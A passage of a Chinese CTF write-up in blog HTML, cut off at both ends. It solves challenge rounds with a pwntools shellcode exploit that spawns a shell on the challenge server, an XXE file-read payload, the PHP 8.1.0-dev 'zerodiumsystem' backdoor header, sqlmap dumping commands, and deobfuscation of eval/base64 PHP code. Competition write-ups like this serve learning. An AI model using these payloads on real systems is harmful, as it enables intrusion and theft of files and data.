class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token number\">15</span><span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span>x <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">458.875</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>solution <span class=\"token operator\">=</span> solve<span class=\"token punctuation\">(</span>equation<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[*]Challenge 2: 5+sqrt(x)=8 Please tell me the result of x.<br>\n[*]Hint: Sqrt means radical sign.</p>\n<p>9</p>\n<pre><code>直接看出来等于9\n</code></pre>\n<p>[*]Challenge 3: x<sup>10+2</sup>10-4*x=6131066258749 Please tell me the result of x.<br>\n19</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">return</span> x<span class=\"token operator\">**</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">10</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token operator\">*</span>x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>solution <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">while</span> func<span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">6131066258749</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>solution <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[*]True! This problem is very simple! Right?!</p>\n<p>[*]Here you go, flag.<br>\nFLAG: qsnctf</p>\n</blockquote>\n<h3 id=\"easy_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#easy_shellcode\">#</a> Easy_Shellcode</h3>\n<blockquote>\n<p>exp:</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'challenge.qsnctf.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30991</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>dz <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token operator\">-</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>dz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 26030b3e3939d0dc5bec32153165ca2f=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"easymd5\"><a class=\"markdownIt-Anchor\" href=\"#easymd5\">#</a> EasyMD5</h3>\n<p>md5 强碰撞，用 <code>fastcoll</code>  生成两个 MD5 相同的 pdf 文件，上传后即可得到 flag。</p>\n<p><img data-src=\"/img/qsnctf_round1/w_1_1.png\" alt=\"w_1_1\"></p>\n<h3 id=\"php的xxe\"><a class=\"markdownIt-Anchor\" href=\"#php的xxe\">#</a> PHP 的 XXE</h3>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYwNTM1Mi9hcnRpY2xlL2RldGFpbHMvMTE2NDk0MTEx\">[Vulhub] PHP 环境 XML 外部实体注入漏洞（XXE）</span></p>\n<p>访问 <code>dom.php</code>  即可开始 xxe</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">xxe</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">test</span> <span class=\"token attr-name\">ANY</span> <span class=\"token punctuation\">></span></span>\t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t&lt;!ENTITY xxe SYSTEM \"file:///flag\" ></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">></span></span>\t\t\t\t\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"/img/qsnctf_round1/w_2_1.png\" alt=\"w_2_1\"></p>\n<h3 id=\"php的后门\"><a class=\"markdownIt-Anchor\" href=\"#php的后门\">#</a> PHP 的后门</h3>\n<p>原题</p>\n<p>参考链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYzMjUzMDQwL2FydGljbGUvZGV0YWlscy8xMjcwMzcwMjY=\">PHP/8.1.0-dev 后门命令执行漏洞复现</span></p>\n<p>http 头添加</p>\n<pre><code>User-Agentt:zerodiumsystem('cat /flag');\n</code></pre>\n<p><img data-src=\"/img/qsnctf_round1/w_3_1.png\" alt=\"w_3_1\"></p>\n<h3 id=\"easy_sqli\"><a class=\"markdownIt-Anchor\" href=\"#easy_sqli\">#</a> Easy_SQLi</h3>\n<p>sql 盲注，简单粗暴拿 sqlmap 梭出来</p>\n<pre><code>sqlmap -r 114.txt --batch --dbs\n</code></pre>\n<p>可以爆出一个 <code>qsnctf</code>  库</p>\n<pre><code>sqlmap -r 114.txt --batch -D qsnctf --dump\n</code></pre>\n<p>直接查看整个库，得到 flag</p>\n<p><img data-src=\"/img/qsnctf_round1/w_4_1.png\" alt=\"w_4_1\"></p>\n<h3 id=\"雏形系统\"><a class=\"markdownIt-Anchor\" href=\"#雏形系统\">#</a> 雏形系统</h3>\n<p>有 <code>www.zip</code> 。</p>\n<p>重点代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$O00OO0</span><span class=\"token operator\">=</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O00O0O</span><span class=\"token operator\">=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">33</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O0OO00</span><span class=\"token operator\">=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">33</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$OO0O00</span><span class=\"token operator\">=</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">18</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token operator\">.</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">24</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$OO0000</span><span class=\"token operator\">=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">7</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">13</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O00O0O</span><span class=\"token operator\">.=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">22</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">36</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">29</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">26</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">32</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">35</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">26</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O00O0O</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"JE8wTzAwMD0iS1hwSnRScmdxVU9IY0Zld3lvUFNXbkNidmtmTUlkbXh6c0VMWVpCVkdoRE51YUFUbFFqaVRhTWh5UUpVclpudHFlS0JzTndSY2ttbG9kVkFTWXBXeGpMRWJJZkNndk9GdWl6RFBHWEh3TzlCaXR6VFNtelVTZ0NzcXA5c2EzaFBxZzlzWWdQdUlzVUJURGpUbUh6VVNtZlhsZ2V4cXNmeGlnZFRTbXpVU3RqVFNtelVTbXpVU21mQlljaGppY0FVaGc1UEt0RzdtSHpVU216VVNtelVxdENIbGdQWFNtUUJiYUZ4bkJOVVNtelVTbXpVU3RmMWJwV01ic2ZwWWM1WFlnUG9sSGZWYTNRb1ozUXNpYzVrVG1QN21IelVTbXpVU216VVNtelVTbVEwaWdQeEVENXVJYXYwblhNR0RlTk5odFFOaWFBeXdrZnZxM0FNbkJOVVNtelVTbXpVU3QwVFNtelVTdDBUU216VVNnRmpiYUZ4U3RZb21IelVTbWY3bUh6VVNtelVTbXpVcXRDSGxnUFhTbVF4SWFVN21IelVTbXpVU216VXF0Q0hsZ1BYU21RdkkyWjdtSHpVU216VVNtelVxdENIbGdQWFNtUU1sa1FQbGtRTWwyNDdtSHpVU216VVNtelVxdENIbGdQWFNnSTFscEYwaWM5dVNlOVZJZ0N4WXRoMWIzR05UYWpUU216VVNtelVTbXpVU216VUljRk5sc3pIUmdkVUN0aDVTdEZQcXBQdmxnUDZJUmZGSVJMSG5CTlVTbXpVU216VVNtelVTbXpkWWd2TXFzMCtpYzV4cWdDWFltVU1uQk5VU216VVNtelVTdDBUU216VVNtelVTbWZwWWM1WFlnUG9sSGZNbGtGQkljRjBUbVA3bUh6VVNtelVTbXpVU216VVNnUHBUbVEwaWdQeEVENXhJYVU5d1JZSGwzZGtoSGJkWWd2TXFzMCtiY1lQd0Qwa0ljUGtpdFFQSWM0a1RHTlVTbXpVU216VVNtelVTbWY3bUh6VVNtelVTbXpVU216VVNtelVTbWZQYjJ2b1NtUTBpZ1B4RUQ1TWxrUVBsa1FNbDI0N21IelVTbXpVU216VVNtelVTdDBUU216VVNtelVTbXpVU216VUljRk5sc3pIOGgrSXZETDQ1bFRmOGgrU2pIUzdtSHpVU216VVNtelVWR05VU216VVZHTlRTbXpVU2dGamJhRnhTTFFQbGM4VFNtelVTdGpUU216VVNtelVTbWZCWWNoamljQVVoZ0w3bUh6VVNtelVTbXpVcTNRdllnUFhTZ0kxbHBGMGljOXVTZTlWYjJlamxlRjBiYVFNYnNVZGJjRjBpYzl1RW16ZElnOE1tSHpVU216VVNtelVLQk5VU216VVNtelVTbXpVU21ma2xnOUhiY0JVaGdTN21IelVTbXpVU216VVNtelVTbVFIVG1RZGwxakJhUmQ3bUh6VVNtelVTbXpVVkdOVVNtelVWR05UU216VVNtUUhTTzBVaGU5R0QxRlpjc1lCYmFGeFkyOXNJbVlZbkJOVVNtelVoZ0xVd1J6ZGExZndaMVFsaDNDeElhaHViYzFQaDEwN21IelVTbWZ6WWM1eElhaE1iY1dNS3BaTmhnTE1uQk5VU216VWljYlVUbWVNcTNGUFltVWRiSGRNU3RqVFNtelVTbXpVU21mUGIydm9TbVM5d0QwOXdEMDl3RDA5d0QwOXdEMDl3RDFHRGVOVVJjNUJZYUdVY2M5MXFIZm5iYzFQU0QwOXdEMDl3RDA5d0QwOXdEMDl3RDA5d1JTN21IelVTbWY5bUh6VVNtZk1JSFVkYkQwOWgyZWRsY1B1aHNicGhnUzl3UlNraXhlcFljdjFoM0FVWWdDeFltZmRJYzFvU0hkVFNtelVTdGpUU216VVNtelVTbWZQYjJ2b1RtRWtwbG9Qb0lhcEhoT1BITThIVERqVFNtelVTdDBUbUh6VVNtei93VT09IjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>把上面代码的 <code>eval</code>  改成 eval，即可得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$O0O000</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"KXpJtRrgqUOHcFewyoPSWnCbvkfMIdmxzsELYZBVGhDNuaATlQjiTaMhyQJUrZntqeKBsNwRckmlodVASYpWxjLEbIfCgvOFuizDPGXHwO9BitzTSmzUSgCsqp9sa3hPqg9sYgPuIsUBTDjTmHzUSmfXlgexqsfxigdTSmzUStjTSmzUSmzUSmfBYchjicAUhg5PKtG7mHzUSmzUSmzUqtCHlgPXSmQBbaFxnBNUSmzUSmzUStf1bpWMbsfpYc5XYgPolHfVa3QoZ3Qsic5kTmP7mHzUSmzUSmzUSmzUSmQ0igPxED5uIav0nXMGDeNNhtQNiaAywkfvq3AMnBNUSmzUSmzUSt0TSmzUSt0TSmzUSgFjbaFxStYomHzUSmf7mHzUSmzUSmzUqtCHlgPXSmQxIaU7mHzUSmzUSmzUqtCHlgPXSmQvI2Z7mHzUSmzUSmzUqtCHlgPXSmQMlkQPlkQMl247mHzUSmzUSmzUqtCHlgPXSgI1lpF0ic9uSe9VIgCxYth1b3GNTajTSmzUSmzUSmzUSmzUIcFNlszHRgdUCth5StFPqpPvlgP6IRfFIRLHnBNUSmzUSmzUSmzUSmzdYgvMqs0+ic5xqgCXYmUMnBNUSmzUSmzUSt0TSmzUSmzUSmfpYc5XYgPolHfMlkFBIcF0TmP7mHzUSmzUSmzUSmzUSgPpTmQ0igPxED5xIaU9wRYHl3dkhHbdYgvMqs0+bcYPwD0kIcPkitQPIc4kTGNUSmzUSmzUSmzUSmf7mHzUSmzUSmzUSmzUSmzUSmfPb2voSmQ0igPxED5MlkQPlkQMl247mHzUSmzUSmzUSmzUSt0TSmzUSmzUSmzUSmzUIcFNlszH8h+IvDL45lTf8h+SjHS7mHzUSmzUSmzUVGNUSmzUVGNTSmzUSgFjbaFxSLQPlc8TSmzUStjTSmzUSmzUSmfBYchjicAUhgL7mHzUSmzUSmzUq3QvYgPXSgI1lpF0ic9uSe9Vb2ejleF0baQMbsUdbcF0ic9uEmzdIg8MmHzUSmzUSmzUKBNUSmzUSmzUSmzUSmfklg9HbcBUhgS7mHzUSmzUSmzUSmzUSmQHTmQdl1jBaRd7mHzUSmzUSmzUVGNUSmzUVGNTSmzUSmQHSO0Uhe9GD1FZcsYBbaFxY29sImYYnBNUSmzUhgLUwRzda1fwZ1Qlh3CxIahubc1Ph107mHzUSmfzYc5xIahMbcWMKpZNhgLMnBNUSmzUicbUTmeMq3FPYmUdbHdMStjTSmzUSmzUSmfPb2voSmS9wD09wD09wD09wD09wD09wD1GDeNURc5BYaGUcc91qHfnbc1PSD09wD09wD09wD09wD09wD09wRS7mHzUSmf9mHzUSmfMIHUdbD09h2edlcPuhsbphgS9wRSkixepYcv1h3AUYgCxYmfdIc1oSHdTSmzUStjTSmzUSmzUSmfPb2voTmEkploPoIapHhOPHM8HTDjTSmzUSt0TmHzUSmz/wU==\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'?>'</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00O0O</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0OO00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$O0O000</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0000</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$OO0O00</span><span class=\"token punctuation\">(</span><span class=\"token 